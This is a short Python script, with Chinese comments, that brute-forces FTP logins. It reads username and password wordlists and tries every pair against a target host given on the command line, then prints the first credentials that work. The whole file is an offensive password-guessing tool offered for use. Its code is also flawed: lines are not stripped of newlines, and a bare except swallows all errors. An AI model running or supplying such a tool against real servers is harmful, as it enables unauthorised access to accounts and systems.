'''
Description: 通过枚举爆破FTP用户密码
Author: yrwang
Date: 2021-09-03 21:21:02
LastEditTime: 2021-09-03 21:36:11
LastEditors: yrwang
'''
# 导入模块
import ftplib
import sys

# 定义暴力破解函数


def brute_ftp(self, user_name_file, passwd_file):
    ftp_object = ftplib.FTP(host=self)
    # 打开字典文件遍历
    with open(user_name_file, 'r') as u_n_f:
        with open(passwd_file, 'r') as p_f:
            user_list = u_n_f.readlines()
            passwd_list = p_f.readlines()
            for name in user_list:
                for passwd in passwd_list:
                    try:
                        ftp_object.login(name, passwd)
                        print(f"login successful! {name}|{passwd}")
                        return True
                    except:
                        pass
    print("this dic is not too big to brute it!!!")
    return False


# 利用指令格式
brute_ftp(sys.argv[1], sys.argv[2], sys.argv[3])
